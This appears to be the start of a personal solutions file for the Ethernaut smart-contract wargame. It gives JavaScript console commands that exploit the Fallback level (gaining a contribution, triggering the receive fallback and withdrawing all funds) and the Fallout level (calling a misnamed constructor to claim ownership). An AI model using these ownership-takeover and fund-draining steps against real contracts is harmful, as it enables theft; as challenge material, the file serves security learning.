# Ethernaut

## Fallback
```
await contract.contribute({value: 100}) // Add a mapping from msg.sender to contributions
await contract.sendTransaction({value: 100}) // Trigger receive fallback
await contract.withdraw() // Withdraw all funds
```

## Fallout
```
await contract.Fallout() // Call constructor; claim ownership
```

## CoinFlip